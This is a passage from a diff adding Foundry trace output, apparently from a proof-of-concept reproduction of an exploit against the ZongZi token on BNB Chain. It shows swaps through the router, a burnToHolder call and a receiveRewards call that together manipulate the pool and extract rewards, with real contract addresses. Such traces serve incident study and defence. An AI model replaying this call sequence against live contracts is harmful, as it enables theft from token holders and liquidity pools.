+    │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x0000000000000000000000000000000000000000509271b29e758220052f7135 → 0x000000000000000000000000000000000000000099163e3ccb4b591a1443bd7f
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000002d525ff47922193202eaafae6 → 0x0000000000000000000000000000000000000000000001e1d1c72d5b97e00000
+    │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0x0000000000000000000000000000000000000000821fb4e6e0000bbc91399445
+    │   │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffd2ada00b86dde6cdfd1550519
+    │   │   │   │   │   │   @ 22: 0 → 0x0000000000000000000000000000000000000000000000000000000066013509
+    │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000b8e081c8a1ede43e00254c2593e5 → 0x000000000000000000000000000000000000b780b0b6b059b289d5dcc81a5e18
+    │   │   │   │   │   │   @ 0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83: 0 → 0x0000000000000000000000000000000000000162f6bbbea78b4fd3337acfa44f
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1904247826086956521739 [1.904e21]
+    │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1500086665670736010186 [1.5e21], 3721674872185990023182857229545340 [3.721e33], 1711355145 [1.711e9]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3721876852489100375645498463903256 [3.721e33]
+    │   │   │   │   ├─ [18480] WBNB_ZONGZI::swap(81203796500469234 [8.12e16], 0, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [3262] WBNB::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 81203796500469234 [8.12e16])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 81203796500469234 [8.12e16])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x00000000000000000000000000000000000000000000005151e26aa0b460dbca → 0x00000000000000000000000000000000000000000000005150c1ec347f8e05d8
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000673abf4cb04ede590b → 0x0000000000000000000000000000000000000000000000673bdfcb1c83b12efd
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1500005461874235540952 [1.5e21]
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3721876852489100375645498463903256 [3.721e33]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1500005461874235540952 [1.5e21], reserve1: 3721876852489100375645498463903256 [3.721e33])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 201980303110352462641234357916 [2.019e29], amount0Out: 81203796500469234 [8.12e16], amount1Out: 0, to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x66013509b77e24147f7e1f0547124063af7c00000000005151e26aa0b460dbca → 0x66013509b780b0b6b059b289d5dcc81a5e1800000000005150c1ec347f8e05d8
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1904329029883456990973 [1.904e21]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [37695] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(1904247826086956521739 [1.904e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1711441545 [1.711e9])
+    │   │   │   │   ├─ [3425] WBNB::transferFrom(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 1904247826086956521739 [1.904e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 1904247826086956521739 [1.904e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000673bdfcb1c83b12efd → 0x00000000000000000000000000000000000000000000000001207e6c34d2d5f2
+    │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x00000000000000000000000000000000000000000000005150c1ec347f8e05d8 → 0x0000000000000000000000000000000000000000000000b88b8138e4ce6c5ee3
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8888000000000000000000 [8.888e21]
+    │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1500005461874235540952 [1.5e21], 3721876852489100375645498463903256 [3.721e33], 1711355145 [1.711e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3404253287961192062691 [3.404e21]
+    │   │   │   │   ├─ [24389] WBNB_ZONGZI::swap(0, 2079621330346392392248088571781636 [2.079e33], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [9163] ZongZi::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2079621330346392392248088571781636 [2.079e33])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], value: 207962133033750439224808857178163 [2.079e32])
+    │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1871659197303753953023279714603473 [1.871e33])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x000000000000000000000000000000000000b780b0b6b059b289d5dcc81a5e18 → 0x00000000000000000000000000000000000050f82dc8c82dd73f77b42974bc14
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000001e1d1c72d5b97e00000 → 0x0000000000000000000000000000000000005c47a90952d61723b54cf37511d1
+    │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x0000000000000000000000000000000000000000000ea20505343ef9a535fd99 → 0x0000000000000000000000000000000000000a40d9f3393c9b221530e8468dcc
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3404253287961192062691 [3.404e21]
+    │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1642255522151595983397409892121620 [1.642e33]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 3404253287961192062691 [3.404e21], reserve1: 1642255522151595983397409892121620 [1.642e33])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 1904247826086956521739 [1.904e21], amount1In: 8888000000000000000000 [8.888e21], amount0Out: 0, amount1Out: 2079621330346392392248088571781636 [2.079e33], to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x66013509b780b0b6b059b289d5dcc81a5e1800000000005150c1ec347f8e05d8 → 0x6601350950f82dc8c82dd73f77b42974bc140000000000b88b8138e4ce6c5ee3
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1871659197312641953023279714603473 [1.871e33]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [5191] Router::getAmountsIn(1296961254356541709922 [1.296e21], [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3404253287961192062691 [3.404e21], 1642255522151595983397409892121620 [1.642e33], 1711355145 [1.711e9]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000031f56907e9f5a3b932d78338046f0000000000000000000000000000000000000000000000464ef3fd3df6b71e62
+    │   │   │   ├─ [670093] 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b::burnToHolder(1013281475888281232341740155307119 [1.013e33], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   │   ├─ [5151] Router::getAmountsOut(1013281475888281232341740155307119 [1.013e33], [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3404253287961192062691 [3.404e21], 1642255522151595983397409892121620 [1.642e33], 1711355145 [1.711e9]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000031f56907e9f5a3b932d78338046f0000000000000000000000000000000000000000000000464ef3fd3df6b71e62
+    │   │   │   │   ├─ [35272] ZongZi::zongziToholder(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1013281475888281232341740155307119 [1.013e33], 1296961254356541709922 [1.296e21])
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b, value: 1013281475888281232341740155307119 [1.013e33])
+    │   │   │   │   │   ├─ [55] 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b::fallback{value: 1296961254356541709922}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc53d92e19d0278385bac9a39af53974a506c691d7ba03b766b869255d3532270: 0 → 0x00000000000000000000000000000000000031f56907e9f5a3b932d78338046f
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000005c47a90952d61723b54cf37511d1 → 0x0000000000000000000000000000000000002a52400168e0736a8275703d0d62
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [656] ZongZi::balanceOf(0xB7a254237E05cccA0a756f75FB78Ab2Df222911b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1013281475888281232341740155307119 [1.013e33]
+    │   │   │   │   ├─ [27967] ZongZi::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 202656295177656246468348031061423 [2.026e32])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 202656295177656246468348031061423 [2.026e32])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc53d92e19d0278385bac9a39af53974a506c691d7ba03b766b869255d3532270: 0x00000000000000000000000000000000000031f56907e9f5a3b932d78338046f → 0x00000000000000000000000000000000000027f7873987f7b62dc246029336c0
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000009fde1ce61fded8b709180a4cdaf
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [4067] ZongZi::transfer(0x000000000000000000000000000000000000dEaD, 810625180710624985873392124245696 [8.106e32])
+    │   │   │   │   │   ├─ emit Transfer(from: 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b, to: 0x000000000000000000000000000000000000dEaD, value: 810625180710624985873392124245696 [8.106e32])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xc53d92e19d0278385bac9a39af53974a506c691d7ba03b766b869255d3532270: 0x00000000000000000000000000000000000027f7873987f7b62dc246029336c0 → 0
+    │   │   │   │   │   │   @ 0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83: 0x0000000000000000000000000000000000000162f6bbbea78b4fd3337acfa44f → 0x000000000000000000000000000000000000295a7df5469f417d95797d62db0f
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b, to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1296961254356 [1.296e12])
+    │   │   │   │   ├─ emit ArriveFeeRewards(param0: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 1296961254356 [1.296e12], param2: 1296961254356 [1.296e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x429557ab0e22d751cb6c51b096800e43eeca46056658def80d550e8b02992f9e: 0 → 0x00000000000000000000000000000000000009fde1ce61fded8b709180a4cdaf
+    │   │   │   │   │   @ 0x63185429a5e8f6b563feef90b34d1f706d7a6d56c453953a51daf17a2ee1b914: 0 → 1
+    │   │   │   │   │   @ 0x23d4f6aa626f0440826c945f960ce1862c8950394b7d52336b92906c80617d43: 0 → 1
+    │   │   │   │   │   @ 19: 0 → 1
+    │   │   │   │   │   @ 0x3d93c31380e3a1c7d780a4d8329f45c28a02b440d760fdd0684e028ff1535181: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0x0000000000000000000000000000000000000000000000056bc75bd1713b9858
+    │   │   │   │   │   @ 33: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 10: 0xfffffffffffffffffffffffffffffffffffffffffffffffce0dc81e56aa00000 → 0xffffffc84bc29c81c687920932aaadb5bf8a8d0b621d04167a35e6da91d88ab8
+    │   │   │   │   │   @ 11: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x8ea143f95a22bfdcc2637cb12679d5456298f4fdeff86a09957b7ce730db8a86: 0 → 1
+    │   │   │   │   │   @ 32: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x66de8ffda797e3de9c05e8fc57b3bf0ec28a930d40b0d285d93c06501cf6a090: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   @ 0x546340d11b2d24f2264a805f4d301f001d22709e1dceb7033caa1b0c072f65fc: 0xfffffffffffffffffffffffffffffffffffffffffffffffce0dc81e56aa00000 → 0xffffff74bd6687447052ed16feaab2465eda609c75488a3ce03bfe4a4cad5acc
+    │   │   │   │   │   @ 0x0a46fccc9d1da59e5246341347aeb23d1d3849a656fca09068d729a0baab8be5: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x71536a2ec44df99339be9ca32cde4d0ccbb625f25b53f6b739ba67810fff0253: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x278e484ebc14447ddf4f0e51bd1c76469fe88ac77169fedbafdad02cc2241cde: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   @ 0xc3a24b0501bd2c13a7e57f2db4369ec4c223447539fc0724a9d55ac4a06ebd4d: 0 → 0x0000001bda1eb1bf1cbc36fb66aaa925203ab97a4ef17df333534d856c63baa4
+    │   │   │   │   │   @ 0x7a1f77ae74b1f31cd94b957cb774175d6b5e155a3e94bd3b7a3f82bcf29db4ef: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x00000037b43d637e39786df6cd55524a407572f49de2fbe666a69b0ad8c77548
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [123213] 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b::receiveRewards(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─ [55] Helper::receive{value: 1296961254356000000000}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xB7a254237E05cccA0a756f75FB78Ab2Df222911b, value: 2593922508712 [2.593e12])
+    │   │   │   │   ├─ emit ReceiveReward(param0: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 1296961254356 [1.296e12], param2: 1296961254356 [1.296e12])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa9d36066b51390988036056c5d566922bbe191a066d8c67059217f1af4b5c10c: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x3d93c31380e3a1c7d780a4d8329f45c28a02b440d760fdd0684e028ff1535181: 0x0000000000000000000000000000000000000000000000056bc75bd1713b9858 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   │   │   │   @ 0x546340d11b2d24f2264a805f4d301f001d22709e1dceb7033caa1b0c072f65fc: 0xffffff74bd6687447052ed16feaab2465eda609c75488a3ce03bfe4a4cad5acc → 0xffffffac71a3eac2a9cb5b0dcc0004909f4fd391132b862346e299552574d014
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00000037b43d637e39786df6cd55524a407572f49de2fbe666a69b0ad8c77548 → 0
+    │   │   │   │   │   @ 34: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x6c60bf8405974b73739deb4ec03c041a780e3beb5949dab347d5e0cbd69731f8: 0 → 0x0000000000000000000000000000000000000000000000000000012df8ea33d4
+    │   │   │   │   │   @ 0x0a46fccc9d1da59e5246341347aeb23d1d3849a656fca09068d729a0baab8be5: 0x0000000000000000000000000000000000000000000000000000012df8ea33d4 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [656] ZongZi::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 858377721424360720681539559296354 [8.583e32]
+    │   │   │   ├─ [268752] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(858377721424360720681539559296354 [8.583e32], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1711441545 [1.711e9])
+    │   │   │   │   ├─ [240463] ZongZi::transferFrom(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 858377721424360720681539559296354 [8.583e32])
+    │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], value: 85837772141547272068153955929635 [8.583e31])
+    │   │   │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 249729934435568890111393262094270 [2.497e32])
+    │   │   │   │   │   ├─ [70884] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(249729934435568890111393262094270 [2.497e32], 0, [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], 1711355145 [1.711e9])
+    │   │   │   │   │   │   ├─ [6956] ZongZi::transferFrom(ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], 249729934435568890111393262094270 [2.497e32])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], to: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], value: 249729934435568890111393262094270 [2.497e32])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5a427663d0f8868d5251f017da83c9e48671f345267043ec0bb0f14c62b4975f: 0x0000000000000000000000000000000000000e7c46c029efab4c0419e44fdbef → 0x000000000000000000000000000000000000022c3dd0064a59b1cd6a48a59431
+    │   │   │   │   │   │   │   │   @ 0x02511c03f424790d569267e75366931a15bdbd9191d24da5ef1623359ba72b82: 0x00000000000000000000000000000000000050f82dc8c82dd73f77b42974bc14 → 0x0000000000000000000000000000000000005d4836b8ebd328d9ae63c51f03d2
+    │   │   │   │   │   │   │   │   @ 0x92fd203faa4ec8e5dbaa150868b6c5e82061a5aa302f13f0e2e072b04ba7e11a: 0x0000000000000000000000000000000000000c5008f023a5519a36af9baa47be → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [893] WBNB_ZONGZI::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 3404253287961192062691 [3.404e21], 1642255522151595983397409892121620 [1.642e33], 1711355145 [1.711e9]
+    │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1891985456587164873508803154215890 [1.891e33]
+    │   │   │   │   │   │   ├─ [38380] WBNB_ZONGZI::swap(448364184022057717146 [4.483e20], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 448364184022057717146 [4.483e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 448364184022057717146 [4.483e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xf8dc43e96a32bfc1c17009d5e909383dcde39bed7dd854578987580f2fb646db: 0x0000000000000000000000000000000000000000000000b88b8138e4ce6c5ee3 → 0x0000000000000000000000000000000000000000000000a03d33a70f9bccd149
+    │   │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x0000000000000000000000000000000000000000000000184e4d91d5329f8d9a
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 2955889103939134345545 [2.955e21]
+    │   │   │   │   │   │   │   ├─ [656] ZongZi::balanceOf(WBNB_ZONGZI: [0xD695C08a4c3B9FC646457aD6b0DC0A3b8f1219fe]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1891985456587164873508803154215890 [1.891e33]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 2955889103939134345545 [2.955e21], reserve1: 1891985456587164873508803154215890 [1.891e33])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 249729934435568890111393262094270 [2.497e32], amount0Out: 448364184022057717146 [4.483e20], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 8: 0x6601350950f82dc8c82dd73f77b42974bc140000000000b88b8138e4ce6c5ee3 → 0x660135095d4836b8ebd328d9ae63c51f03d20000000000a03d33a70f9bccd149
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 448364184022057717146 [4.483e20]
+    │   │   │   │   │   │   ├─ [9223] WBNB::withdraw(448364184022057717146 [4.483e20])
+    │   │   │   │   │   │   │   ├─ [83] Router::fallback{value: 448364184022057717146}()
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 448364184022057717146 [4.483e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x0000000000000000000000000000000000000000000000184e4d91d5329f8d9a → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [55] ZongZi::fallback{value: 448364184022057717146}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [2769] ZongZi::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 44069988429806274725539987428400 [4.406e31])
+    │   │   │   │   │   │   ├─ emit Approval(owner: ZongZi: [0xBB652D0f1EbBc2C16632076B1592d45Db61a7a68], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 44069988429806274725539987428400 [4.406e31])
+    │   │   │   │   │   │   ├─  storage changes:
